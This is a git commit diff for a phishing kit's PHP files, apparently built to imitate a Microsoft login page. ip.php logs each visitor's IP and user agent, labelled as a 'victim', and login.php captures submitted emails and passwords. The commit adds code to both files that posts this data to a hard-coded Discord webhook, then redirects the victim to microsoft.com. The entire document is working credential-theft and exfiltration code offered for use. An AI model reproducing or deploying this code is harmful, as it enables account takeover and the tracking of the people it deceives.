3c9b599d076a13fe80c3329ae5fcf84dfe6cc267
James Phelps <jamesph2012@outlook.com>
2024-12-21 11:19:13 +0000

    Commit 2nd Commit 3aB+1M

--- ip.php
+++ ip.php
@@ -1,21 +1,17 @@
 <?php
 
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-    }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-    }
-else
-    {
-      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-    }
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
+} else {
+    $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
+}
+
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
-
+// Save data to a file
 $file = 'ip.txt';
 $victim = "IP: ";
 $fp = fopen($file, 'a');
@@ -24,6 +20,25 @@ fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
 fwrite($fp, $browser);
-
-
 fclose($fp);
+
+// Send data to a Discord webhook
+$webhookURL = "https://discord.com/api/webhooks/1314916680354365521/CuqeqAucg5UNUkXroMmw0mi1vKDa-Hsd2uCW-lk0ysvRcL3DWRZCHLkql9Q5t7rCwW8R"; // Replace with your Discord webhook URL
+
+$data = [
+    "content" => "**New Visitor Logged:**\n" .
+        "**IP Address:** " . $ipaddress .
+        "**User-Agent:** " . $browser
+];
+
+$options = [
+    "http" => [
+        "header" => "Content-type: application/json\r\n",
+        "method" => "POST",
+        "content" => json_encode($data),
+    ]
+];
+
+$context = stream_context_create($options);
+$response = file_get_contents($webhookURL, false, $context);
+?>
--- login.php
+++ login.php
@@ -1,5 +1,25 @@
 <?php
 
+// Save credentials to file
 file_put_contents("usernames.txt", "Account: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+
+// Send credentials to Discord webhook
+$webhookURL = "https://discord.com/api/webhooks/1314916680354365521/CuqeqAucg5UNUkXroMmw0mi1vKDa-Hsd2uCW-lk0ysvRcL3DWRZCHLkql9Q5t7rCwW8R"; // Replace with your Discord webhook URL
+$message = [
+    "content" => "**New Login Attempt**\n" . 
+                 "Email: " . $_POST['loginfmt'] . "\n" . 
+                 "Password: " . $_POST['passwd']
+];
+$options = [
+    "http" => [
+        "header" => "Content-Type: application/json\r\n",
+        "method" => "POST",
+        "content" => json_encode($message)
+    ]
+];
+$context = stream_context_create($options);
+file_get_contents($webhookURL, false, $context);
+
+// Redirect user to Microsoft
 header('Location: https://microsoft.com');
 exit();
